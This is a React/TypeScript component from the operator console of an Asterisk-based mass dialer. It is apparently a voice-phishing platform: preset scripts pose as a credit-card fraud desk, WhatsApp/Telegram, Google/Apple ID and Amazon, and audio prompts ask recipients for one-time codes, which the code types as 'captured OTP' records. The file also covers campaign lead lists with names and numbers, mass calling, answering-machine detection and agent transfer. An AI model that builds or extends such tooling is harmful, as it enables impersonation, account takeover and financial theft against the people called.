import React, { useState, useEffect, useRef } from 'react';
import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt, SystemUser, DialingCampaign, CampaignLead, CallCenterTenant, CallFlowMode } from '../types';
import { appendAuthTokenToUrl, authFetch as fetch } from '../utils/authClient';
import {
  Rocket,
  PhoneCall,
  PhoneOff,
  PhoneForwarded,
  ShieldAlert,
  ShieldCheck,
  Radio,
  BellRing,
  CheckCircle2,
  CheckCircle,
  XCircle,
  Phone,
  Clock,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  KeyRound,
  AlertCircle,
  Building2,
  CreditCard,
  MessageSquare,
  Lock,
  Unlock,
  ShoppingBag,
  Sliders,
  Play,
  Pause,
  RotateCcw,
  Volume2,
  UploadCloud,
  FileAudio,
  Music,
  Plus,
  Mic,
  Square,
  Sparkles,
  HelpCircle,
  UserCheck,
  User,
  Terminal,
  Pencil,
  Edit3,
  Save,
  X,
  Settings2,
  Zap,
  ArrowRight,
  DollarSign,
  Users,
  Layers,
  ListOrdered,
  Megaphone,
  Target,
  UserPlus,
  PhoneIncoming,
  Upload,
  FileText,
  ExternalLink,
  Send,
} from 'lucide-react';

export interface CampaignAudioConfig {
  introAudioPath: string;    // Bienvenida / Alerta
  promptAudioPath: string;   // Solicitud OTP o Press 1
  agentAudioPath: string;    // Previo a transferir a asesor
  successAudioPath: string;  // Confirmación / Éxito
  cancelCodeAudioPath?: string; // Audio "Un momento por favor, le estamos enviando un código de cancelación"
  otpVerifyWaitAudioPath?: string; // Audio "Un momento por favor, le estamos enviando su código de verificación"
}

export interface CampaignEntity {
  id: string;
  name: string;
  subtitle: string;
  icon: 'building' | 'card' | 'message' | 'lock' | 'shopping' | 'sliders';
  color: string;
  defaultCallerName?: string;
  defaultCallerNum?: string;
  introAudioPath: string;    // Saludo / Alerta
  promptAudioPath: string;   // Solicitud OTP
  agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
  successAudioPath: string;  // Validación Exitosa
  waitAudioPath?: string;    // Espera
  cancelCodeAudioPath?: string; // Audio al pulsar 1 en modo Código de Cancelación
  otpVerifyWaitAudioPath?: string; // Audio al pulsar 1 en IVR de Captura OTP
  holdMusicAudioPath?: string; // Música de Hold / Espera personalizada por guión
  isLocked?: boolean;        // Bloqueo manual: previene sobreescritura por sincronización automática
  isActive?: boolean;        // Si es false, está inactivo y no aparece para asignar a Call Centers ni Usuarios
  campaignId?: string;       // ID de la campaña de marcación vinculada
  campaignName?: string;     // Nombre de la campaña de marcación vinculada
}

export type ServiceCampaignKey = string;

export interface MassCallItem {
  id?: string;
  number: string;
  name?: string;
  status: 'queued' | 'calling' | 'in_line' | 'on_hold' | 'ended' | 'machine_detected' | 'failed' | 'success';
  time: string;
  msg: string;
  duration?: number;
  channel?: string;
  cause?: string;
  agent?: string;       // e.g. '1001', '1002', 'ringall'
  agentName?: string;   // e.g. 'Ext. 1001 (Juan Pérez)' or '⚡ Ring-All'
  statusDetail?: string; // e.g. 'Hablando con Asesor', 'En Menú IVR', 'Timbrando'
  startedAt?: number;
}

interface ProductionOperationsTabProps {
  extensions: PjsipExtension[];
  carriers: CarrierTrunk[];
  audios?: AudioPrompt[];
  tenants?: CallCenterTenant[];
  currentUser?: SystemUser;
  onAddAudio?: (audio: AudioPrompt) => void;
  onTriggerSync: () => void;
  onNavigateToLiveCalls?: () => void;
  isSyncing: boolean;
  amdEnabled?: boolean;
  isTogglingAmd?: boolean;
  onToggleAmd?: () => void;
  globalOtpRecords?: CapturedOtpRecord[];
  globalLiveCalls?: any[];
}

export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
  extensions,
  carriers,
  audios = [],
  tenants = [],
  currentUser,
  onAddAudio,
  onTriggerSync,
  onNavigateToLiveCalls,
  isSyncing,
  amdEnabled: amdEnabledProp,
  isTogglingAmd: isTogglingAmdProp,
  onToggleAmd: onToggleAmdProp,
  globalOtpRecords,
  globalLiveCalls,
}) => {
  // Determinar usuario activo y privilegios de Administrador para proteger edición de Guiones / Entidades
  const activeUser = currentUser || (() => {
    try {
      const savedUsers = localStorage.getItem('ast20_users');
      const savedId = localStorage.getItem('ast20_current_user_id') || 'user-admin';
      if (savedUsers) {
        const parsed = JSON.parse(savedUsers);
        return parsed.find((u: any) => u.id === savedId) || parsed[0];
      }
    } catch (e) {}
    return null;
  })();

  const isAdmin = activeUser ? activeUser.role === 'admin' : false;
  const isSuperAdmin = isAdmin && !activeUser?.tenantId;
  const isAgent = activeUser ? activeUser.role === 'agent' : false;
  const isSupervisor = activeUser ? activeUser.role === 'supervisor' : false;

  // User assigned extension: Si un usuario tiene extensión asignada, sus llamadas individuales retornan EXCLUSIVAMENTE a su extensión
  const userAssignedExt = (activeUser?.assignedExtensions && activeUser.assignedExtensions.length > 0)
    ? activeUser.assignedExtensions[0]
    : '1001';

  const isSingleExtensionAgent = Boolean(
    !isAdmin && !isSupervisor && activeUser?.assignedExtensions && activeUser.assignedExtensions.length === 1
  );

  const [agentExtension, setAgentExtension] = useState<string>(() => {
    return isSingleExtensionAgent ? userAssignedExt : 'ringall';
  });

  const activeUserRef = useRef(activeUser);
  useEffect(() => {
    activeUserRef.current = activeUser;
  }, [activeUser]);

  useEffect(() => {
    if (isSingleExtensionAgent) {
      setAgentExtension(userAssignedExt);
    }
  }, [activeUser?.id, isSingleExtensionAgent, userAssignedExt]);

  useEffect(() => {
    if (isSingleExtensionAgent && agentExtension) {
      try {
        const savedForAgent = localStorage.getItem('prod_selected_service_' + agentExtension);
        if (savedForAgent) {
          setSelectedService(savedForAgent as ServiceCampaignKey);
        }
      } catch (_) {}
    }
  }, [agentExtension, isSingleExtensionAgent]);

  // Mode selection: disparador individual (1 a 1 hacia asesor asignado), acción IVR y centro de llamadas masivas (Ring-All a todas las extensiones)
  const [productionMode, setProductionMode] = useState<'single' | 'ivr_action' | 'mass_campaign'>('single');

  const ALL_CALL_FLOW_MODES: CallFlowMode[] = ['cancel_code', 'otp', 'press1', 'hybrid'];
  const normalizeUiFlowMode = (mode?: string | null): CallFlowMode => {
    if (mode === 'otp_press1') return 'otp';
    if (mode === 'otp' || mode === 'press1' || mode === 'hybrid' || mode === 'cancel_code') return mode;
    return 'cancel_code';
  };
  const [serverAssignedFlowMode, setServerAssignedFlowMode] = useState<CallFlowMode | null>(null);
  const [serverAllowedFlowModes, setServerAllowedFlowModes] = useState<CallFlowMode[] | null>(null);
  const [serverCanUseMassCalls, setServerCanUseMassCalls] = useState<boolean | null>(null);
  const allowedFlowModesRef = useRef<CallFlowMode[]>(ALL_CALL_FLOW_MODES);

  useEffect(() => {
    setServerCanUseMassCalls(null);
  }, [activeUser?.id]);

  // Single launch state
  const [targetNumber, setTargetNumber] = useState('16104803845');
  const [targetName, setTargetName] = useState('');
  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>(() => {
    try {
      const initialExt = userAssignedExt || '1001';
      const savedForAgent = localStorage.getItem('prod_selected_service_' + initialExt);
      if (savedForAgent) return savedForAgent as ServiceCampaignKey;
      const saved = localStorage.getItem('prod_selected_service_v3');
      if (saved && saved !== 'bank') return saved as ServiceCampaignKey;
    } catch (_) {}
    return 'service';
  });
  const [customServiceName, setCustomServiceName] = useState('Servicio al Cliente');
  const [callFlowMode, setCallFlowModeState] = useState<CallFlowMode>(() => {
    try {
      const saved = localStorage.getItem('ast20_call_flow_mode');
      if (saved === 'otp' || saved === 'press1' || saved === 'hybrid' || saved === 'cancel_code' || saved === 'otp_press1') {
        return normalizeUiFlowMode(saved);
      }
    } catch (_) {}
    return 'cancel_code';
  });

  const setCallFlowMode = (mode: CallFlowMode) => {
    if (!isSuperAdmin && !allowedFlowModesRef.current.includes(mode)) {
      return;
    }
    setCallFlowModeState(mode);
    try {
      localStorage.setItem('ast20_call_flow_mode', mode);
      if (isSuperAdmin) {
        fetch('/api/asterisk/action/set-default', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ mode }),
        }).catch(() => {});
      }
    } catch (_) {}
  };

  // Mass Campaign State (Donde se activa el Ring-All para que timbren todas las extensiones)
  const [massNumbersText, setMassNumbersText] = useState('16104803845\n18005550199');
  const [massDelaySeconds, setMassDelaySeconds] = useState(5);
  const [isMassRunning, setIsMassRunning] = useState(false);
  const [massCurrentIndex, setMassCurrentIndex] = useState(0);
  const [massTotalCount, setMassTotalCount] = useState(0);
  const [massActiveNumber, setMassActiveNumber] = useState<string | null>(null);
  const [massLog, setMassLog] = useState<MassCallItem[]>([]);
  const [massFilter, setMassFilter] = useState<'all' | 'in_line' | 'on_hold' | 'ended' | 'machine'>('all');
  const [isHangingUpAllMass, setIsHangingUpAllMass] = useState(false);
  const massCancelRef = useRef(false);

  // File Upload State for Mass Campaign (.txt / .csv list)
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [uploadedFileName, setUploadedFileName] = useState<string | null>(null);
  const [uploadedFileFeedback, setUploadedFileFeedback] = useState<string | null>(null);
  const [isDraggingFile, setIsDraggingFile] = useState(false);

  // AMD (Answering Machine Detection / Detección de Grabadora) State (synced with App menu)
  const [localAmdEnabled, setLocalAmdEnabled] = useState<boolean>(true);
  const [localIsTogglingAmd, setLocalIsTogglingAmd] = useState<boolean>(false);
  const amdEnabled = typeof amdEnabledProp === 'boolean' ? amdEnabledProp : localAmdEnabled;
  const isTogglingAmd = typeof isTogglingAmdProp === 'boolean' ? isTogglingAmdProp : localIsTogglingAmd;
  const [isPurgingZombies, setIsPurgingZombies] = useState<boolean>(false);

  const handlePurgeZombies = async () => {
    setIsPurgingZombies(true);
    try {
      const res = await fetch('/api/asterisk/call/purge-zombies', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setLaunchFeedback({
          text: `✓ ${data.message || 'Canales huérfanos y bucles 8888 purgados con éxito.'}`,
          type: 'success',
        });
        setActiveCall((prev) => (prev?.number === '8888' || prev?.number?.includes('8888') ? null : prev));
      }
    } catch (_) {
      setLaunchFeedback({
        text: 'Aviso: Solicitud de purga enviada a Asterisk.',
        type: 'info',
      });
    } finally {
      setIsPurgingZombies(false);
      setTimeout(() => setLaunchFeedback(null), 4000);
    }
  };

  // Fetch AMD status & Press 1 destination configuration on mount
  useEffect(() => {
    if (typeof amdEnabledProp !== 'boolean') {
      fetch('/api/asterisk/amd/status')
        .then((r) => r.json())
        .then((data) => {
          if (data.success && typeof data.enabled === 'boolean') {
            setLocalAmdEnabled(data.enabled);
          }
        })
        .catch(() => {});
    }

    fetch('/api/asterisk/press1-destination')
      .then((r) => r.json())
      .then((data) => {
        if (data.success && !isSingleExtensionAgent) {
          if (data.mode === 'ringall') {
            setAgentExtension('ringall');
          } else if (Array.isArray(data.extensions) && data.extensions.length > 0) {
            setAgentExtension(data.extensions[0]);
          }
        }
      })
      .catch(() => {});
  }, [amdEnabledProp, isSingleExtensionAgent]);

  const handleToggleAmd = async () => {
    if (onToggleAmdProp) {
      onToggleAmdProp();
      return;
    }
    setLocalIsTogglingAmd(true);
    try {
      const nextVal = !localAmdEnabled;
      const res = await fetch('/api/asterisk/amd/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: nextVal }),
      });
      const data = await res.json();
      if (data.success) {
        setLocalAmdEnabled(data.enabled);
      }
    } catch (_) {
    } finally {
      setLocalIsTogglingAmd(false);
    }
  };

  const handleSelectAgentExtension = (val: string) => {
    setAgentExtension(val);
    if (val === 'ringall') {
      fetch('/api/asterisk/press1-destination/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: 'ringall', extensions: [] }),
      }).catch(() => {});
    } else {
      fetch('/api/asterisk/press1-destination/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: 'specific', extensions: [val] }),
      }).catch(() => {});
    }
  };

  // Initial predefined campaign templates (only 'service' active by default; unused templates marked isActive: false until admin activates or edits them)
  const initialCampaignEntities: CampaignEntity[] = [
    {
      id: 'service',
      name: 'Servicio al Cliente',
      subtitle: 'Atención y soporte',
      icon: 'building',
      color: 'emerald',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/bienvenida_corporativa',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor',
      successAudioPath: 'custom/operacion_bloqueada_exito',
      holdMusicAudioPath: 'default',
      isActive: true,
    },
    {
      id: 'card',
      name: 'Tarjeta de Crédito',
      subtitle: 'Cargo no reconocido',
      icon: 'card',
      color: 'sky',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/alerta_cargo_tarjeta',
      promptAudioPath: 'custom/solicitar_otp_tarjeta',
      agentAudioPath: 'custom/conectar_asesor_tarjetas',
      successAudioPath: 'custom/tarjeta_protegida',
      holdMusicAudioPath: 'default',
      isActive: false,
    },
    {
      id: 'whatsapp',
      name: 'WhatsApp / Telegram',
      subtitle: 'Migración de cuenta',
      icon: 'message',
      color: 'emerald',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/alerta_migracion_whatsapp',
      promptAudioPath: 'custom/solicitar_codigo_sms',
      agentAudioPath: 'custom/conectar_soporte_tecnico',
      successAudioPath: 'custom/verificacion_exitosa',
      holdMusicAudioPath: 'default',
      isActive: false,
    },
    {
      id: 'google',
      name: 'Google / Apple ID',
      subtitle: 'Alerta de seguridad',
      icon: 'lock',
      color: 'amber',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/alerta_seguridad_google',
      promptAudioPath: 'custom/solicitar_codigo_google',
      agentAudioPath: 'custom/conectar_soporte_cuentas',
      successAudioPath: 'custom/acceso_restringido_exito',
      holdMusicAudioPath: 'default',
      isActive: false,
    },
    {
      id: 'amazon',
      name: 'Amazon / Envíos',
      subtitle: 'Autorización pedido',
      icon: 'shopping',
      color: 'orange',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/alerta_compra_amazon',
      promptAudioPath: 'custom/solicitar_codigo_amazon',
      agentAudioPath: 'custom/conectar_soporte_pedidos',
      successAudioPath: 'custom/pedido_cancelado_exito',
      holdMusicAudioPath: 'default',
      isActive: false,
    },
    {
      id: 'custom',
      name: 'Personalizado',
      subtitle: 'Configuración libre',
      icon: 'sliders',
      color: 'purple',
      defaultCallerName: '',
      defaultCallerNum: '',
      introAudioPath: 'custom/bienvenida_corporativa',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor',
      successAudioPath: 'custom/operacion_bloqueada_exito',
      holdMusicAudioPath: 'default',
      isActive: false,
    },
  ];

  // Predefined dialing campaigns for agents to select and dial
  const initialDialingCampaigns: DialingCampaign[] = [
    {
      id: 'camp-service',
      name: 'Campaña Soporte y Ventas - Línea Directa',
      description: 'Atención personalizada de clientes, encuestas y confirmaciones',
      entityId: 'service',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [
        { id: 'lead-1', number: '16104803845', name: 'Juan Pérez (Caso #8492)', status: 'pending', notes: 'Solicitud de información' },
        { id: 'lead-2', number: '18095550199', name: 'Carlos Alcántara', status: 'pending', notes: 'Confirmación de cuenta' },
        { id: 'lead-3', number: '18295551234', name: 'María Santana', status: 'pending', notes: 'Atención al cliente' },
      ],
      createdAt: new Date().toISOString(),
    },
    {
      id: 'camp-card',
      name: 'Campaña Visa / MasterCard - Tarjetas de Crédito',
      description: 'Bloqueo preventivo por cargo en comercio internacional no reconocido',
      entityId: 'card',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [
        { id: 'lead-4', number: '18005550199', name: 'Soporte Tarjetas Prueba', status: 'pending' },
        { id: 'lead-5', number: '18492003040', name: 'Roberto Díaz', status: 'pending', notes: 'Tarjeta Platinum' },
      ],
      createdAt: new Date().toISOString(),
    },
    {
      id: 'camp-whatsapp',
      name: 'Campaña WhatsApp / Telegram - Verificación',
      description: 'Solicitud de verificación SMS/OTP por registro en nuevo smartphone',
      entityId: 'whatsapp',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [
        { id: 'lead-6', number: '18004567890', name: 'Usuario Soporte WA', status: 'pending' },
        { id: 'lead-7', number: '18294448899', name: 'Elena Morales', status: 'pending' },
      ],
      createdAt: new Date().toISOString(),
    },
    {
      id: 'camp-google',
      name: 'Campaña Google / Apple ID - Acceso Crítico',
      description: 'Alerta inmediata de sesión iniciada desde ubicación desconocida',
      entityId: 'google',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [
        { id: 'lead-8', number: '18005550122', name: 'Cuenta Administrador Google', status: 'pending' },
      ],
      createdAt: new Date().toISOString(),
    },
    {
      id: 'camp-amazon',
      name: 'Campaña Amazon / Envíos - Retención de Pedido',
      description: 'Autorización urgente de compra de alto valor retenida en despacho',
      entityId: 'amazon',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [
        { id: 'lead-9', number: '18005550133', name: 'Cliente Prime Amazon', status: 'pending' },
      ],
      createdAt: new Date().toISOString(),
    },
    {
      id: 'camp-custom',
      name: 'Campaña Libre / Marcación Personalizada',
      description: 'Marcación manual abierta a cualquier número objetivo y entidad',
      entityId: 'custom',
      callerIdNum: '',
      callerIdName: '',
      status: 'active',
      leads: [],
      createdAt: new Date().toISOString(),
    },
  ];

  // Dialing campaigns state persisted in localStorage
  const [dialingCampaigns, setDialingCampaigns] = useState<DialingCampaign[]>(() => {
    try {
      const saved = localStorage.getItem('ast20_dialing_campaigns_v2');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch (_) {}
    return initialDialingCampaigns;
  });

  // Selected Campaign ID - Agents have full permission to select and change campaign freely
  const [selectedCampaignId, setSelectedCampaignId] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('ast20_selected_campaign_id');
      if (saved && saved !== 'camp-bank') return saved;
    } catch (_) {}
    return 'camp-service';
  });

  // Quick contact addition state for campaigns
  const [isAddingLeadModalOpen, setIsAddingLeadModalOpen] = useState(false);
  const [newLeadNumber, setNewLeadNumber] = useState('');
  const [newLeadName, setNewLeadName] = useState('');
  const [newLeadNotes, setNewLeadNotes] = useState('');
  const [campaignFeedback, setCampaignFeedback] = useState<string | null>(null);

  // Campaign entities state persisted in localStorage
  const [campaignEntities, setCampaignEntities] = useState<CampaignEntity[]>(() => {
    try {
      const saved = localStorage.getItem('prod_campaign_entities_v3');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          return parsed.map((ent: any) => {
            if (ent && (ent.id === 'bank' || !ent.introAudioPath)) {
              return {
                ...ent,
                id: ent.id === 'bank' ? 'service' : ent.id,
                name: ent.name && !ent.name.toLowerCase().includes('banc') ? ent.name : 'Servicio al Cliente',
                introAudioPath: ent.introAudioPath || 'custom/bienvenida_corporativa',
                promptAudioPath: ent.promptAudioPath || 'custom/solicitar_codigo_otp',
                agentAudioPath: ent.agentAudioPath || 'custom/conectar_asesor',
                successAudioPath: ent.successAudioPath || 'custom/operacion_bloqueada_exito',
                holdMusicAudioPath: ent.holdMusicAudioPath || 'default',
              };
            }
            return ent;
          });
        }
      }
    } catch (e) {}
    return initialCampaignEntities;
  });

  // State to track if the selected entity has been explicitly saved/locked
  const [isEntitySaving, setIsEntitySaving] = useState(false);
  const [isEntitySaved, setIsEntitySaved] = useState(false);

  // Server persistence refs for IVR Workspace (Guion / Entidad a Simular, Campanas, Modo IVR) across browsers
  const isIvrWsHydratedRef = useRef(false);
  const isApplyingRemoteIvrWsRef = useRef(false);
  const lastIvrWsServerTsRef = useRef(0);
  const lastIvrWsVersionRef = useRef<number>(-1);
  const isFetchingIvrWsRef = useRef<boolean>(false);

  const resolvedWorkspaceTenantId = React.useMemo(() => {
    if (isSuperAdmin) return '';
    if (activeUser?.tenantId) return activeUser.tenantId;
    const firstExtNum = parseInt(String(activeUser?.assignedExtensions?.[0] || '').trim(), 10);
    if (!isNaN(firstExtNum) && Array.isArray(tenants)) {
      const matched = tenants.find((t) => firstExtNum >= t.extensionStart && firstExtNum <= t.extensionEnd);
      if (matched?.id) return matched.id;
    }
    return '';
  }, [isSuperAdmin, activeUser?.tenantId, activeUser?.assignedExtensions, tenants]);

  const [tenantServerAssignedIds, setTenantServerAssignedIds] = useState<string[] | null>(null);

  const pushIvrWorkspaceToServer = React.useCallback(
    async (overrides?: {
      campaignEntities?: CampaignEntity[];
      selectedService?: ServiceCampaignKey;
      dialingCampaigns?: DialingCampaign[];
      selectedCampaignId?: string;
      callFlowMode?: CallFlowMode;
    }) => {
      try {
        const uId = activeUser?.id || 'user-admin';
        const uName = activeUser?.username || 'admin';
        const entitiesToPush = overrides?.campaignEntities ?? campaignEntities;
        const workspace = {
          campaignEntities: entitiesToPush,
          selectedService: overrides?.selectedService ?? selectedService,
          dialingCampaigns: overrides?.dialingCampaigns ?? dialingCampaigns,
          selectedCampaignId: overrides?.selectedCampaignId ?? selectedCampaignId,
          callFlowMode: overrides?.callFlowMode ?? callFlowMode,
        };
        if (isSuperAdmin && Array.isArray(entitiesToPush) && entitiesToPush.length > 0) {
          fetch('/api/app/master-entities', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ entities: entitiesToPush }),
          })
            .then(() => {
              window.dispatchEvent(new CustomEvent('master-entities-updated'));
            })
            .catch(() => {});
        }
        const res = await fetch('/api/app/ivr-workspace', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: uId, username: uName, tenantId: resolvedWorkspaceTenantId || undefined, workspace }),
        });
        if (res.ok) {
          const d = await res.json();
          if (d.lastUpdated) {
            lastIvrWsServerTsRef.current = d.lastUpdated;
          }
          // Refresh lightweight version baseline so we don't re-pull our own save
          fetch(`/api/app/ivr-workspace/version?userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}&tenantId=${encodeURIComponent(resolvedWorkspaceTenantId)}`)
            .then((r) => (r.ok ? r.json() : null))
            .then((vd) => {
              if (typeof vd?.version === 'number' && vd.version > 0) {
                lastIvrWsVersionRef.current = vd.version;
              }
            })
            .catch(() => {});
        }
      } catch (_) {}
    },
    [isSuperAdmin, activeUser?.id, activeUser?.username, resolvedWorkspaceTenantId, campaignEntities, selectedService, dialingCampaigns, selectedCampaignId, callFlowMode]
  );

  const fetchIvrWorkspaceFromServer = React.useCallback(async (forceFull = false) => {
    if (isFetchingIvrWsRef.current) return;
    isFetchingIvrWsRef.current = true;
    try {
      const uId = activeUser?.id || 'user-admin';
      const uName = activeUser?.username || 'admin';
      const qs = `userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}&tenantId=${encodeURIComponent(resolvedWorkspaceTenantId)}`;

      // Check lightweight version before downloading full workspace JSON
      let latestVersion = -1;
      if (isIvrWsHydratedRef.current && !forceFull) {
        try {
          const verRes = await fetch(`/api/app/ivr-workspace/version?${qs}`);
          if (verRes.ok) {
            const verData = await verRes.json();
            if (typeof verData?.version === 'number') {
              latestVersion = verData.version;
              if (latestVersion > 0 && latestVersion === lastIvrWsVersionRef.current) {
                return;
              }
            }
          }
        } catch (_) {}
      }

      const res = await fetch(`/api/app/ivr-workspace?${qs}`);
      if (!res.ok) {
        isIvrWsHydratedRef.current = true;
        return;
      }
      const data = await res.json();
      if (latestVersion > 0) {
        lastIvrWsVersionRef.current = latestVersion;
      } else {
        fetch(`/api/app/ivr-workspace/version?${qs}`)
          .then((r) => (r.ok ? r.json() : null))
          .then((vd) => {
            if (typeof vd?.version === 'number' && vd.version > 0) {
              lastIvrWsVersionRef.current = vd.version;
            }
          })
          .catch(() => {});
      }

      if (Array.isArray(data.assignedEntityIds)) {
        setTenantServerAssignedIds(data.assignedEntityIds);
      } else {
        setTenantServerAssignedIds(null);
      }

      if (data.assignedCallFlowMode) {
        setServerAssignedFlowMode(normalizeUiFlowMode(data.assignedCallFlowMode));
      }
      if (Array.isArray(data.allowedCallFlowModes) && data.allowedCallFlowModes.length > 0) {
        const cleanAllowed = Array.from(
          new Set<CallFlowMode>(
            data.allowedCallFlowModes.map((m: any) => normalizeUiFlowMode(String(m))).filter((m: CallFlowMode) => ALL_CALL_FLOW_MODES.includes(m))
          )
        );
        if (cleanAllowed.length > 0) {
          setServerAllowedFlowModes(cleanAllowed);
        }
      }
      if (typeof data.canUseMassCalls === 'boolean') {
        setServerCanUseMassCalls(data.canUseMassCalls);
      }

      if (data.success && data.workspace) {
        const ws = data.workspace;
        if (ws.lastUpdated && ws.lastUpdated <= lastIvrWsServerTsRef.current && isIvrWsHydratedRef.current) {
          return;
        }
        lastIvrWsServerTsRef.current = ws.lastUpdated || Date.now();
        isApplyingRemoteIvrWsRef.current = true;
        isIvrWsHydratedRef.current = true;

        if (Array.isArray(ws.campaignEntities)) {
          if (Array.isArray(data.assignedEntityIds)) {
            setCampaignEntities((prev) => {
              const map = new Map<string, CampaignEntity>();
              for (const e of [...prev, ...ws.campaignEntities]) {
                if (e?.id) map.set(e.id, e);
              }
              return Array.from(map.values());
            });
          } else if (ws.campaignEntities.length > 0) {
            setCampaignEntities(ws.campaignEntities);
            try {
              localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(ws.campaignEntities));
            } catch (_) {}
          }
        }
        if (ws.selectedService !== undefined) {
          setSelectedService(ws.selectedService as ServiceCampaignKey);
          try {
            localStorage.setItem('prod_selected_service_v3', String(ws.selectedService));
          } catch (_) {}
        }
        if (Array.isArray(ws.dialingCampaigns) && ws.dialingCampaigns.length > 0) {
          setDialingCampaigns(ws.dialingCampaigns);
          try {
            localStorage.setItem('ast20_dialing_campaigns_v2', JSON.stringify(ws.dialingCampaigns));
          } catch (_) {}
        }
        if (ws.selectedCampaignId) {
          setSelectedCampaignId(String(ws.selectedCampaignId));
          try {
            localStorage.setItem('ast20_selected_campaign_id', String(ws.selectedCampaignId));
          } catch (_) {}
        }
        if (ws.callFlowMode === 'otp' || ws.callFlowMode === 'press1' || ws.callFlowMode === 'hybrid' || ws.callFlowMode === 'cancel_code' || ws.callFlowMode === 'otp_press1') {
          const normalizedWsMode = normalizeUiFlowMode(ws.callFlowMode);
          const allowedFromServer: CallFlowMode[] =
            Array.isArray(data.allowedCallFlowModes) && data.allowedCallFlowModes.length > 0
              ? Array.from(new Set<CallFlowMode>(data.allowedCallFlowModes.map((m: any) => normalizeUiFlowMode(String(m)))))
              : ALL_CALL_FLOW_MODES;
          const resolvedMode: CallFlowMode =
            isSuperAdmin || allowedFromServer.includes(normalizedWsMode)
              ? normalizedWsMode
              : (normalizeUiFlowMode(data.assignedCallFlowMode) || allowedFromServer[0] || 'cancel_code');
          setCallFlowModeState(resolvedMode);
          try {
            localStorage.setItem('ast20_call_flow_mode', resolvedMode);
          } catch (_) {}
        }

        setTimeout(() => {
          isApplyingRemoteIvrWsRef.current = false;
        }, 400);
      } else {
        if (Array.isArray(data.assignedEntities) && data.assignedEntities.length > 0) {
          setCampaignEntities((prev) => {
            const map = new Map<string, CampaignEntity>();
            for (const e of [...prev, ...data.assignedEntities]) {
              if (e?.id) map.set(e.id, e);
            }
            return Array.from(map.values());
          });
        }
        isIvrWsHydratedRef.current = true;
        // Bootstrap server with existing local config on first run if Super Admin already customized this browser
        if (isSuperAdmin) {
          pushIvrWorkspaceToServer();
        }
      }
    } catch (_) {
      isIvrWsHydratedRef.current = true;
    } finally {
      isFetchingIvrWsRef.current = false;
    }
  }, [activeUser?.id, activeUser?.username, resolvedWorkspaceTenantId, isSuperAdmin]);

  useEffect(() => {
    isIvrWsHydratedRef.current = false;
    lastIvrWsServerTsRef.current = 0;
    lastIvrWsVersionRef.current = -1;
    fetchIvrWorkspaceFromServer(true);
    const interval = setInterval(() => {
      if (typeof document !== 'undefined' && document.hidden) return;
      fetchIvrWorkspaceFromServer();
    }, 12000);
    const onFocus = () => fetchIvrWorkspaceFromServer();
    window.addEventListener('focus', onFocus);
    return () => {
      clearInterval(interval);
      window.removeEventListener('focus', onFocus);
    };
  }, [fetchIvrWorkspaceFromServer]);

  useEffect(() => {
    if (!isIvrWsHydratedRef.current || isApplyingRemoteIvrWsRef.current) return;
    const timer = setTimeout(() => {
      pushIvrWorkspaceToServer();
    }, 800);
    return () => clearTimeout(timer);
  }, [campaignEntities, selectedService, dialingCampaigns, selectedCampaignId, callFlowMode, pushIvrWorkspaceToServer]);

  // Handle campaign selection by agent or admin
  const handleSelectCampaign = (campaignId: string) => {
    setSelectedCampaignId(campaignId);
    try {
      localStorage.setItem('ast20_selected_campaign_id', campaignId);
    } catch (_) {}

    const camp = dialingCampaigns.find((c) => c.id === campaignId);
    if (camp) {
      // Synchronize associated Guión / Entity
      const matchingEntity = campaignEntities.find((e) => e.id === camp.entityId);
      if (matchingEntity) {
        handleSelectEntity(matchingEntity);
      }
      // Caller ID es asignado directamente por el proveedor SIP (no sobrescribir desde campaña)

      // If campaign has leads, load next pending lead into target fields
      const nextLead = camp.leads.find((l) => l.status === 'pending') || camp.leads[0];
      if (nextLead) {
        setTargetNumber(nextLead.number);
        if (nextLead.name) setTargetName(nextLead.name);
      }

      setCampaignFeedback(`✓ Campaña activa: "${camp.name}" seleccionada para marcar.`);
      setTimeout(() => setCampaignFeedback(null), 3500);
    }
  };

  // Load a specific lead from campaign into the dialer
  const handleLoadCampaignLead = (lead: CampaignLead) => {
    setTargetNumber(lead.number);
    if (lead.name) setTargetName(lead.name);
    setCampaignFeedback(`✓ Número cargado al marcador: ${lead.number} (${lead.name || 'Sin nombre'})`);
    setTimeout(() => setCampaignFeedback(null), 3000);
  };

  // Quick add contact to active campaign
  const handleAddLeadToCampaign = (e?: React.FormEvent) => {
